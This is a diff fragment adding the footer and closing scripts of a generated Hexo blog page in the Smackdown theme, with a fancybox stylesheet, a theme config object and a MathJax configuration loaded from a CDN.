+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
